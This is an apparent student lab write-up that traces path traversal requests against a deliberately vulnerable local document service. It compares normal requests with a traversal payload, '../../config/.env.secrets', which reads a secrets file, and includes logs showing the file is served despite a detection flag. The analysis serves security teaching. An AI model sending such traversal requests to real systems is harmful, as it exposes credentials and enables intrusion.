# Trace Analysis

The Path Traversal tracing was performed against the vulnerable Path Traversal application using **Burp Suite** as the proxy and the application's server logs as the supporting trace source.This allowed to compare normal document access with a controlled Path Traversal request and correlate the HTTP request, application path-resolution decision, server log, and HTTP response.


---

## Normal Document Listing – PT-01

The first request established the normal document environment:

```http
GET /api/documents/list HTTP/1.1
Host: localhost:3001
User-Agent: curl/7.68.0
Accept: */*
```

The application returned:

```json
{
  "status": "success",
  "allowedDirectory": "public/documents/",
  "documents": [
    "audit_report_2026.txt",
    "network_guidelines.txt",
    "security_policy_v2.txt"
  ]
}
```

The server log recorded:

```text
::ffff:127.0.0.1 - - [01/Oct/2026:04:21:18 +0000]
"GET /api/documents/list HTTP/1.1" 200 147 "-" "curl/7.68.0" - 0.756 ms
```

This provides the baseline for the document service. The application identifies `public/documents/` as the allowed document directory and returns the available files.


---

## Legitimate Document Access – PT-02

A legitimate document request was then captured using:

```http
GET /api/documents/view?file=audit_report_2026.txt HTTP/1.1
Host: localhost:3001
User-Agent: curl/7.68.0
Accept: */*
```

The application returned `HTTP/1.1 200 OK` and the contents of `audit_report_2026.txt`.

The corresponding application log recorded:

```text
[DOC] [2026-10-01T04:24:08.040Z] Access request from IP: ::ffff:127.0.0.1
[DOC] File param: "audit_report_2026.txt" |
Target: ".../public/documents/audit_report_2026.txt" |
Traversal flag: false
[DOC] Served file: ".../public/documents/audit_report_2026.txt" (956 bytes)
```

The trace shows that the supplied filename was resolved to a file inside the intended `public/documents/` directory. The application's traversal flag was `false`, and the file was successfully served with HTTP status `200`.

---

## Path Traversal Attack – PT-03

The controlled traversal request changed the `file` parameter to:

```text
../../config/.env.secrets
```

The resulting HTTP request was:

```http
GET /api/documents/view?file=../../config/.env.secrets HTTP/1.1
Host: localhost:3001
User-Agent: curl/7.68.0
Accept: */*
```

The application returned `HTTP/1.1 200 OK` and the contents of the requested `.env.secrets` file.

The server log provides the key detection and tracing evidence:

```text
[DOC] File param: "../../config/.env.secrets" |
Target: "/home/student/CCSEP_Assignment/path-traversal/vulnerable/config/.env.secrets" |
Traversal flag: true
[DOC] Served file: "/home/student/CCSEP_Assignment/path-traversal/vulnerable/config/.env.secrets" (1161 bytes)
```

This trace demonstrates that the application detected the traversal pattern (`Traversal flag: true`) but still resolved the request to the file outside the intended public documents directory and served it successfully.

The HTTP response status of `200 OK`, together with the returned file content, confirms the observed vulnerable behaviour.


---

## Path Traversal with JSON Accept Header – PT-04

A second controlled traversal request used the same traversal payload while adding an `Accept` header:

```http
GET /api/documents/view?file=../../config/.env.secrets HTTP/1.1
Host: localhost:3001
User-Agent: curl/7.68.0
Accept: application/json
```

The application again returned `HTTP/1.1 200 OK`.

The JSON response included fields showing the requested filename and resolved path, together with the returned content:

```json
{
  "status": "success",
  "fileName": "../../config/.env.secrets",
  "resolvedPath": ".../config/.env.secrets",
  "content": "..."
}
```

The corresponding server log recorded the request;

```text
[DOC] [2026-10-01T04:26:28.555Z] Access request from IP: ::ffff:127.0.0.1
[DOC] File param: "../../config/.env.secrets" |
Target: ".../vulnerable/config/.env.secrets" |
Traversal flag: true
[DOC] Served file: ".../vulnerable/config/.env.secrets" (1161 bytes)
```

This confirms that the same traversal behaviour occurred when the client requested a JSON response.


---

## Trace Comparison

| Trace | File parameter | Traversal flag | Resolved location | HTTP result | Observed behaviour |
|---|---|---|---|---|---|
| PT-01 | N/A | N/A | `public/documents/` | `200` | Normal document listing |
| PT-02 | `audit_report_2026.txt` | `false` | `public/documents/audit_report_2026.txt` | `200` | Legitimate document served |
| PT-03 | `../../config/.env.secrets` | `true` | `config/.env.secrets` | `200` | Traversal target served |
| PT-04 | `../../config/.env.secrets` | `true` | `config/.env.secrets` | `200` | Traversal target served as JSON |
